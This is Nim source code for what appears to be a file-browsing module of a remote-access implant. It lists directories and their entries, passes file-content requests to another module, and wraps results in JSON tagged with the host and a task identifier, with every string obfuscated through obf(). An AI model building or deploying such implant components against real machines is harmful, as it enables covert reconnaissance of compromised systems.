import std/[json, strutils]
import ../utils/global
import ../utils/general/strings
import ../utils/linapi/handlers
import ../utils/linapi/utils
import execution
import files

proc hasGetContent(parameters: string): bool =
  # Checks that params ask for file content
  if parameters.len == 0:
    return false
  try:
    let parsed = parseJson(parameters)
    case parsed.kind
    of JObject:
      if not parsed.hasKey(obf("getContent")):
        return false
      let v = parsed[obf("getContent")]
      if v.kind == JNull:
        return false
      return v.kind == JBool and v.getBool()
    of JString:
      try:
        let inner = parseJson(parsed.getStr())
        if inner.kind != JObject or not inner.hasKey(obf("getContent")):
          return false
        let v = inner[obf("getContent")]
        if v.kind == JNull:
          return false
        return v.kind == JBool and v.getBool()
      except JsonParsingError:
        return false
    else:
      return false
  except JsonParsingError:
    return false

proc cleanPath(path: string): string =
  # Cleans a path by stripping spaces and trailing slashes
  var s = path.strip().replace(obf("\\"), pathSep)
  if s.len == 0:
    return ""
  while s.len > 1 and s[^1] == '/':
    s.setLen(s.len - 1)
  s

proc isRootRequest(path: string): bool =
  # Checks that the path asks for the root listing
  let s = path.strip()
  s.len == 0 or s == pathSep or s == obf("\\") or s == obf(" ")

proc formatSize(bytes: uint64): string =
  # Formats a byte count as a readable size
  var buf: array[16, char]
  let n = fmtSize(bytes, buf)
  if n > 0:
    result = newString(n)
    copyMem(addr result[0], addr buf[0], n)
  else:
    result = obf("0 B")

proc entryJson(basePath: string; ent: DirEntry): JsonNode =
  # Builds a json node for one directory entry
  let full = joinPath(basePath, ent.name)
  let last = formatPathDate(full)
  let sz =
    if ent.isDir:
      $countDirEntries(full)
    else:
      let size = getPathSize(full)
      if size < 0:
        obf("?")
      else:
        formatSize(size.uint64)
  %*{
    obf("path"): full,
    obf("lastEdit"): last,
    obf("type"): if ent.isDir: obf("folder") else: obf("file"),
    obf("size"): sz,
  }

proc listPath(path: string): seq[JsonNode] =
  # Lists the entries under a path
  result = @[]
  let base = cleanPath(path)
  for ent in listDirEntries(if base.len == 0: pathSep else: base):
    result.add entryJson(if base.len == 0: pathSep else: base, ent)

proc run*(host, taskTag, input, params: string; buf: var openArray[char]): int =
  # Entrypoint that lists a folder or returns file content
  if hasGetContent(params):
    return files.run(host, taskTag, input, params, buf)

  let raw = input.strip()

  if isRootRequest(raw):
    let content = listPath(pathSep)
    let msg = $( %*{
      obf("option"): obf("output"),
      obf("type"): obf("folders"),
      obf("host"): host,
      obf("task_tag"): taskTag,
      obf("content"): content,
    })
    return writeMsg(msg, buf)

  let inputPath = cleanPath(raw)
  let exists = pathExists(inputPath)
  let isDir = pathIsDir(inputPath)

  if not exists or not isDir:
    let msg = $( %*{
      obf("option"): obf("output"),
      obf("type"): obf("folders"),
      obf("host"): host,
      obf("task_tag"): taskTag,
      obf("error"): obf("Path does not exist"),
    })
    return writeMsg(msg, buf)

  let entries = listPath(inputPath)
  let msg = $( %*{
    obf("option"): obf("output"),
    obf("type"): obf("folders"),
    obf("host"): host,
    obf("task_tag"): taskTag,
    obf("content"): entries,
  })
  writeMsg(msg, buf)
